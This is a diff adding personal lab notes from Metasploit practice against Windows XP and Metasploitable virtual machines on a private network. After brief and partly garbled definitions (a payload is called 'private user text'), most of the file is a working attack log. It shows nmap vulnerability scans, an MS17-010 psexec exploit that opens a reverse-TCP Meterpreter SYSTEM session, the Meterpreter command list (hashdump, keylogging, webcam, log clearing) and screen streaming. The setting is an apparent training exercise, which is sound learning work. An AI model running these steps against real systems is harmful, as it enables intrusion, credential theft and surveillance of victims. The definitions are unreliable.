@@ -1,0 +1,505 @@
+Metasploit framework - Target xp & Metasploitable OS 
+
+xp Win -  192.168.176.153
+metasploitable -  192.168.176.128
+
+help
+show payloads
+show exploits
+nmap -Pn 192.168.172.128
+map scan report for 192.168.172.128
+Host is up (0.056s latency).
+PORT     STATE SERVICE
+21/tcp   open  ftp
+554/tcp  open  rtsp
+1723/tcp open  pptp
+-------------------------------------
+
+Terms ---
+-------------------------------------------------------------------------------------
+vulnerability is a weakness exploit by a attacker to perform unauthorized 
+action with device, application, network 
+as - week passwords, buffer overflow, SQL injection so on .....
+-------------------------------------------------------------------------------------
+exploit is piece of code and chunk of data or sequence of a command 
+that take the advantage of vulnerability present in a device, network and application. 
+to cause unintended behaviour occur in computer system 
+such as unauthorized behavior, privilege escalation etc 
+--------------------------------------------------------------------------------------
+Payload is the part of private user text which put also contained malware, such 
+as worm, viruses, which perform the malicious action like deleting data, sending 
+spam or encrypting data etc. 
+-------------------------------------------------------------------------------------
+auxiliary are module present in Metasploit use to scanning, sniffing, and fuzzing 
+or useful to brute force attack and scanning vulnerabilities.
+-----------------------------------------------------------------------------------------
+Post module use for post exploitation - compromise target machine 
+and gather evidence or pivot deep with network.
+------------------------------------------------------------------------------------------
+
+=============================================================
+
+
+msf6 > nmap -sS 192.168.176.153
+[*] exec: nmap -sS 192.168.176.153
+
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-11 15:43 EST
+Nmap scan report for 192.168.176.153
+Host is up (0.00013s latency).
+Not shown: 996 closed tcp ports (reset)
+PORT     STATE SERVICE
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+1025/tcp open  NFS-or-IIS
+MAC Address: 00:0C:29:4B:0B:F2 (VMware)
+
+Nmap done: 1 IP address (1 host up) scanned in 1.50 seconds
+
+
+-------------------------------------------------------------------------------------------------
+
+msf6 > nmap --script vuln 192.168.176.153
+[*] exec: nmap --script vuln 192.168.176.153
+
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-11 15:47 EST
+Nmap scan report for 192.168.176.153
+Host is up (0.00046s latency).
+Not shown: 996 closed tcp ports (reset)
+PORT     STATE SERVICE
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+1025/tcp open  NFS-or-IIS
+MAC Address: 00:0C:29:4B:0B:F2 (VMware)
+
+Host script results:
+| smb-vuln-ms08-067: 
+|   VULNERABLE:
+|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2008-4250
+|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
+|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
+|           code via a crafted RPC request that triggers the overflow during path canonicalization.
+|           
+|     Disclosure date: 2008-10-23
+|     References:
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
+|_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
+|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND
+| smb-vuln-ms17-010: 
+|   VULNERABLE:
+|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0143
+|     Risk factor: HIGH
+|       A critical remote code execution vulnerability exists in Microsoft SMBv1
+|        servers (ms17-010).
+|           
+|     Disclosure date: 2017-03-14
+|     References:
+|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
+|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+|_smb-vuln-ms10-054: false
+
+Nmap done: 1 IP address (1 host up) scanned in 54.36 seconds
+
+--------------------------------------------------------------------------------------------------
+
+msf6 > search ms17-010
+
+Matching Modules
+================
+
+   #   Name                                           Disclosure Date  Rank     Check  Description
+   -   ----                                           ---------------  ----     -----  -----------
+   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
+   1     \_ target: Automatic Target                  .                .        .      .
+   2     \_ target: Windows 7                         .                .        .      .
+   3     \_ target: Windows Embedded Standard 7       .                .        .      .
+   4     \_ target: Windows Server 2008 R2            .                .        .      .
+   5     \_ target: Windows 8                         .                .        .      .
+   6     \_ target: Windows 8.1                       .                .        .      .
+   7     \_ target: Windows Server 2012               .                .        .      .
+   8     \_ target: Windows 10 Pro                    .                .        .      .
+   9     \_ target: Windows 10 Enterprise Evaluation  .                .        .      .
+   10  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
+   11    \_ target: Automatic                         .                .        .      .
+   12    \_ target: PowerShell                        .                .        .      .
+   13    \_ target: Native upload                     .                .        .      .
+   14    \_ target: MOF upload                        .                .        .      .
+   15    \_ AKA: ETERNALSYNERGY                       .                .        .      .
+   16    \_ AKA: ETERNALROMANCE                       .                .        .      .
+   17    \_ AKA: ETERNALCHAMPION                      .                .        .      .
+   18    \_ AKA: ETERNALBLUE                          .                .        .      .
+   19  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
+   20    \_ AKA: ETERNALSYNERGY                       .                .        .      .
+   21    \_ AKA: ETERNALROMANCE                       .                .        .      .
+   22    \_ AKA: ETERNALCHAMPION                      .                .        .      .
+   23    \_ AKA: ETERNALBLUE                          .                .        .      .
+   24  auxiliary/scanner/smb/smb_ms17_010             .                normal   No     MS17-010 SMB RCE Detection
+   25    \_ AKA: DOUBLEPULSAR                         .                .        .      .
+   26    \_ AKA: ETERNALBLUE                          .                .        .      .
+   27  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
+   28    \_ target: Execute payload (x64)             .                .        .      .
+   29    \_ target: Neutralize implant                .                .        .      .
+
+
+Interact with a module by name or index. For example info 29, use 29 or use exploit/windows/smb/smb_doublepulsar_rce  
+After interacting with a module you can manually set a TARGET with set TARGET 'Neutralize implant'
+
+msf6 > 
+
+-------------------------------------------------------------------------------------------------------------------
+
+
+msf6 > use exploit/windows/smb/ms17_010_eternalblue
+[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
+msf6 exploit(windows/smb/ms17_010_eternalblue) > 
+
+
+-------------------------------------------------------------------------------------------------------------------
+
+
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.176.153
+RHOSTS => 192.168.176.153
+
+
+-------------------------------------------------------------------------------------------------------------------
+
+
+msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
+
+[*] Started reverse TCP handler on 192.168.176.181:4444 
+[*] 192.168.176.153:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+[+] 192.168.176.153:445   - Host is likely VULNERABLE to MS17-010! - Windows XP 3790 Service Pack 1 x86 (32-bit)
+[*] 192.168.176.153:445   - Scanned 1 of 1 hosts (100% complete)
+[+] 192.168.176.153:445 - The target is vulnerable.
+[-] 192.168.176.153:445 - Exploit aborted due to failure: no-target: This module only supports x64 (64-bit) targets
+[*] Exploit completed, but no session was created.
+
+
+--------------------------------------------------------------------------------------------------------------------------------------
+
+
+msf6 exploit(windows/smb/ms17_010_eternalblue) > back
+
+--------------------------------------------------------------------------------------------------------------------------------------
+
+msf6 > use exploit/windows/smb/ms17_010_psexec
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 192.168.176.153
+RHOSTS => 192.168.176.153
+msf6 exploit(windows/smb/ms17_010_psexec) > exploit 
+
+[*] Started reverse TCP handler on 192.168.176.181:4444 
+[*] 192.168.176.153:445 - Target OS: Windows XP 3790 Service Pack 1
+[*] 192.168.176.153:445 - Filling barrel with fish... done
+[*] 192.168.176.153:445 - <---------------- | Entering Danger Zone | ---------------->
+[*] 192.168.176.153:445 -       [*] Preparing dynamite...
+[*] 192.168.176.153:445 -               [*] Trying stick 1 (x64)...Boom!
+[*] 192.168.176.153:445 -       [+] Successfully Leaked Transaction!
+[*] 192.168.176.153:445 -       [+] Successfully caught Fish-in-a-barrel
+[*] 192.168.176.153:445 - <---------------- | Leaving Danger Zone | ---------------->
+[*] 192.168.176.153:445 - Reading from CONNECTION struct at: 0xfffffadfe6295810
+[*] 192.168.176.153:445 - Built a write-what-where primitive...
+[+] 192.168.176.153:445 - Overwrite complete... SYSTEM session obtained!
+[*] 192.168.176.153:445 - Selecting native target
+[*] 192.168.176.153:445 - Uploading payload... BGkumTOw.exe
+[*] 192.168.176.153:445 - Created \BGkumTOw.exe...
+[+] 192.168.176.153:445 - Service started successfully...
+[*] 192.168.176.153:445 - Deleting \BGkumTOw.exe...
+[*] Sending stage (177734 bytes) to 192.168.176.153
+[*] Meterpreter session 1 opened (192.168.176.181:4444 -> 192.168.176.153:1053) at 2025-01-11 16:11:41 -0500
+
+meterpreter > 
+
+-----------------------------------------------------------------------------------------------------------------------------------------
+
+
+meterpreter > help
+
+Core Commands
+=============
+
+    Command                   Description
+    -------                   -----------
+    ?                         Help menu
+    background                Backgrounds the current ses
+                              sion
+    bg                        Alias for background
+    bgkill                    Kills a background meterpre
+                              ter script
+    bglist                    Lists running background sc
+                              ripts
+    bgrun                     Executes a meterpreter scri
+                              pt as a background thread
+    channel                   Displays information or con
+                              trol active channels
+    close                     Closes a channel
+    detach                    Detach the meterpreter sess
+                              ion (for http/https)
+    disable_unicode_encoding  Disables encoding of unicod
+                              e strings
+    enable_unicode_encoding   Enables encoding of unicode
+                               strings
+    exit                      Terminate the meterpreter s
+                              ession
+    get_timeouts              Get the current session tim
+                              eout values
+    guid                      Get the session GUID
+    help                      Help menu
+    info                      Displays information about
+                              a Post module
+    irb                       Open an interactive Ruby sh
+                              ell on the current session
+    load                      Load one or more meterprete
+                              r extensions
+    machine_id                Get the MSF ID of the machi
+                              ne attached to the session
+    migrate                   Migrate the server to anoth
+                              er process
+    pivot                     Manage pivot listeners
+    pry                       Open the Pry debugger on th
+                              e current session
+    quit                      Terminate the meterpreter s
+                              ession
+    read                      Reads data from a channel
+    resource                  Run the commands stored in
+                              a file
+    run                       Executes a meterpreter scri
+                              pt or Post module
+    secure                    (Re)Negotiate TLV packet en
+                              cryption on the session
+    sessions                  Quickly switch to another s
+                              ession
+    set_timeouts              Set the current session tim
+                              eout values
+    sleep                     Force Meterpreter to go qui
+                              et, then re-establish sessi
+                              on
+    ssl_verify                Modify the SSL certificate
+                              verification setting
+    transport                 Manage the transport mechan
+                              isms
+    use                       Deprecated alias for "load"
+    uuid                      Get the UUID for the curren
+                              t session
+    write                     Writes data to a channel
+
+
+Stdapi: File system Commands
+============================
+
+    Command                   Description
+    -------                   -----------
+    cat                       Read the contents of a file
+                               to the screen
+    cd                        Change directory
+    checksum                  Retrieve the checksum of a
+                              file
+    cp                        Copy source to destination
+    del                       Delete the specified file
+    dir                       List files (alias for ls)
+    download                  Download a file or director
+                              y
+    edit                      Edit a file
+    getlwd                    Print local working directo
+                              ry (alias for lpwd)
+    getwd                     Print working directory
+    lcat                      Read the contents of a loca
+                              l file to the screen
+    lcd                       Change local working direct
+                              ory
+    ldir                      List local files (alias for
+                               lls)
+    lls                       List local files
+    lmkdir                    Create new directory on loc
+                              al machine
+    lpwd                      Print local working directo
+                              ry
+    ls                        List files
+    mkdir                     Make directory
+    mv                        Move source to destination
+    pwd                       Print working directory
+    rm                        Delete the specified file
+    rmdir                     Remove directory
+    search                    Search for files
+    show_mount                List all mount points/logic
+                              al drives
+    upload                    Upload a file or directory
+
+
+Stdapi: Networking Commands
+===========================
+
+    Command                   Description
+    -------                   -----------
+    arp                       Display the host ARP cache
+    getproxy                  Display the current proxy c
+                              onfiguration
+    ifconfig                  Display interfaces
+    ipconfig                  Display interfaces
+    netstat                   Display the network connect
+                              ions
+    portfwd                   Forward a local port to a r
+                              emote service
+    resolve                   Resolve a set of host names
+                               on the target
+    route                     View and modify the routing
+                               table
+
+
+Stdapi: System Commands
+=======================
+
+    Command                   Description
+    -------                   -----------
+    clearev                   Clear the event log
+    drop_token                Relinquishes any active imp
+                              ersonation token.
+    execute                   Execute a command
+    getenv                    Get one or more environment
+                               variable values
+    getpid                    Get the current process ide
+                              ntifier
+    getprivs                  Attempt to enable all privi
+                              leges available to the curr
+                              ent process
+    getsid                    Get the SID of the user tha
+                              t the server is running as
+    getuid                    Get the user that the serve
+                              r is running as
+    kill                      Terminate a process
+    localtime                 Displays the target system
+                              local date and time
+    pgrep                     Filter processes by name
+    pkill                     Terminate processes by name
+    ps                        List running processes
+    reboot                    Reboots the remote computer
+    reg                       Modify and interact with th
+                              e remote registry
+    rev2self                  Calls RevertToSelf() on the
+                               remote machine
+    shell                     Drop into a system command
+                              shell
+    shutdown                  Shuts down the remote compu
+                              ter
+    steal_token               Attempts to steal an impers
+                              onation token from the targ
+                              et process
+    suspend                   Suspends or resumes a list
+                              of processes
+    sysinfo                   Gets information about the
+                              remote system, such as OS
+
+
+Stdapi: User interface Commands
+===============================
+
+    Command                   Description
+    -------                   -----------
+    enumdesktops              List all accessible desktop
+                              s and window stations
+    getdesktop                Get the current meterpreter
+                               desktop
+    idletime                  Returns the number of secon
+                              ds the remote user has been
+                               idle
+    keyboard_send             Send keystrokes
+    keyevent                  Send key events
+    keyscan_dump              Dump the keystroke buffer
+    keyscan_start             Start capturing keystrokes
+    keyscan_stop              Stop capturing keystrokes
+    mouse                     Send mouse events
+    screenshare               Watch the remote user deskt
+                              op in real time
+    screenshot                Grab a screenshot of the in
+                              teractive desktop
+    setdesktop                Change the meterpreters cur
+                              rent desktop
+    uictl                     Control some of the user in
+                              terface components
+
+
+Stdapi: Webcam Commands
+=======================
+
+    Command                   Description
+    -------                   -----------
+    record_mic                Record audio from the defau
+                              lt microphone for X seconds
+    webcam_chat               Start a video chat
+    webcam_list               List webcams
+    webcam_snap               Take a snapshot from the sp
+                              ecified webcam
+    webcam_stream             Play a video stream from th
+                              e specified webcam
+
+
+Stdapi: Audio Output Commands
+=============================
+
+    Command                   Description
+    -------                   -----------
+    play                      play a waveform audio file
+                              (.wav) on the target system
+
+
+Priv: Elevate Commands
+======================
+
+    Command                   Description
+    -------                   -----------
+    getsystem                 Attempt to elevate your pri
+                              vilege to that of local sys
+                              tem.
+
+
+Priv: Password database Commands
+================================
+
+    Command                   Description
+    -------                   -----------
+    hashdump                  Dumps the contents of the S
+                              AM database
+
+
+Priv: Timestomp Commands
+========================
+
+    Command                   Description
+    -------                   -----------
+    timestomp                 Manipulate file MACE attrib
+                              utes
+
+For more info on a specific command, use <command> -h or help <command>.                                              
+
+
+
+------------------------------------------------------------------------------------------------------------------------
+
+meterpreter > sysinfo
+Computer        : OMKAN-P83ED23P5
+OS              : Windows Server 2003 (5.2 Build 3790, Service Pack 1).
+Architecture    : x64
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 2
+Meterpreter     : x86/windows
+meterpreter > 
+
+
+------------------------------------------------------------------------------------------------------------------------
+
+
+meterpreter > scearnshare
+[-] Unknown command: scearnshare. Did you mean screenshare? Run the help command for more details.
+meterpreter > screenshare
+[*] Preparing player...
+[*] Opening player at: /home/kali/SKoEaKbM.html
+[*] Streaming...
+
+----------------------------------------------------------------------------------------------------------------------
